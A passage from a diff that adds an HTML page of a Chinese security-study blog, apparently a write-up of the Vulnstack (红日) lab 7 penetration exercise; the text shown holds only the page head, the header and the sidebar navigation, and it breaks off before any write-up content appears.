@@ -1,0 +1,5184 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="红日靶场七完整渗透记录：DMZ 打点、三层内网渗透、横向移动、域控接管与持久化">
+      
+      
+        <meta name="author" content="ethicalpaws">
+      
+      
+        <link rel="canonical" href="https://ethicalpaws.github.io/youth-sandbox/tech-study/practice/lab/vulnstack/red-team7/red-team7/">
+      
+      
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../../../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>红日靶场七 - 青春沙盒</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../../../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../../../css/timeago.css">
+    
+      <link rel="stylesheet" href="../../../../../../asserts/css/home.css">
+    
+      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    
+    <script>__md_scope=new URL("../../../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="deep-purple">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#_1" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../../../../.." title="青春沙盒" class="md-header__button md-logo" aria-label="青春沙盒" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M6.5 20q-2.28 0-3.89-1.57Q1 16.85 1 14.58q0-1.95 1.17-3.48 1.18-1.53 3.08-1.95.63-2.3 2.5-3.72Q9.63 4 12 4q2.93 0 4.96 2.04Q19 8.07 19 11q1.73.2 2.86 1.5 1.14 1.28 1.14 3 0 1.88-1.31 3.19T18.5 20Z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            青春沙盒
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              红日靶场七
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="deep-purple"  aria-label="切换到深色模式"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="切换到深色模式" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="deep-purple" data-md-color-accent="indigo"  aria-label="切换到浅色模式"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="切换到浅色模式" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="Share" aria-label="Share" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/ethicalpaws/youth-sandbox" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    youth-sandbox
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../../../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  首页
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../../" class="md-tabs__link">
+          
+  
+  
+    
+  
+  $技术学习
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../../../life/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  青春记录
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../../../bridge/novel/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  修桥工程
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../../../updates/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  动态推送
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../../../spiritual/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  精神食粮
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../../../about/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  关于本站
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../../../../role-panel/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  ❗️ 角色档案
+
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../../../.." title="青春沙盒" class="md-nav__button md-logo" aria-label="青春沙盒" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M6.5 20q-2.28 0-3.89-1.57Q1 16.85 1 14.58q0-1.95 1.17-3.48 1.18-1.53 3.08-1.95.63-2.3 2.5-3.72Q9.63 4 12 4q2.93 0 4.96 2.04Q19 8.07 19 11q1.73.2 2.86 1.5 1.14 1.28 1.14 3 0 1.88-1.31 3.19T18.5 20Z"/></svg>
+
+    </a>
+    青春沙盒
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/ethicalpaws/youth-sandbox" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    youth-sandbox
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    首页
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../../" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    $技术学习
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2" id="__nav_2_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    $技术学习
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_2" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../../knowledge/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    📖 知识笔记
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    📖 知识笔记
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../knowledge/01-foundation/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    01-基础知识
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../knowledge/02-network-protocol-security/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    02-网络协议安全
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../knowledge/03-web-basics/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    03-Web基础漏洞
+  
+
+    
+  </span>
+  
+  
+    
+  
+  
+    <span class="md-status md-status--🔄"></span>
+  
+
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../knowledge/04-web-advanced/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    04-Web高级漏洞
+  
+
+    
+  </span>
+  
+  
+    
+  
+  
+    <span class="md-status md-status--⬜"></span>
+  
+
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../knowledge/05-java-security/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    05-Java安全
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../knowledge/06-red-blue-confrontation/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    06-红蓝对抗
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../knowledge/07-server-side-component-security/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    07-中间件安全
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../knowledge/08-software-system-security/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    08-软件与系统安全
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_3" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🎯 实战练习
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    🎯 实战练习
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../ctf/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CTF训练
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../cve/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CVE分析
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    lab靶场练习
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_4" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../../weekly-check/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    📋 每周检测
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    📋 每周检测
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_5" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../../arsenal/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ⚔️ 军火库
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2_5" id="__nav_2_5_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    ⚔️ 军火库
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../arsenal/tools/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    工具箱
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../arsenal/commands/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    命令大全
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../../../life/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    青春记录
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3" id="__nav_3_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    青春记录
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3_2" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../../../life/study-plan/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    📝 每周计划
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3_2" id="__nav_3_2_label" tabindex="0">
